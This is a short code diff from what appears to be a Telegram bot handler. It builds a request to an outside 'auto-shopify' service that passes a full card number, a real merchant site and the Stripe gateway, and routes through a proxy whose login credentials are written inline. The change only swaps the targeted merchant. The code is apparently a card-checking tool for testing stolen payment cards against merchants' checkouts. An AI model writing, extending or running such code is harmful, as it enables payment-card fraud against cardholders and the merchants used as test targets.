@@ -3196,7 +3196,7 @@ async def process_st1(update: Update, context: ContextTypes.DEFAULT_TYPE, payloa
         # NOTE: adjust this endpoint/params if your backend expects different query keys for Stripe.
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://unikeyhealth.com"
+            f"?site=https://vasileandpavel.com"
             f"&cc={full_card}"
             f"&gateway=stripe"
             f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
